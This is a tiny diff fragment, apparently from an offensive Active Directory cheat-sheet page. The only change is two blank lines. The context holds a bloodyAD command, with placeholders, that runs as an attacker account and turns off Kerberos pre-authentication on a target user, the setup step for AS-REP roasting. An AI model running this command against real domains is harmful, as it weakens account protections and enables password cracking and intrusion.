@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:07.517652+00:00'
 ```bash
 $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True
 ```
+
+
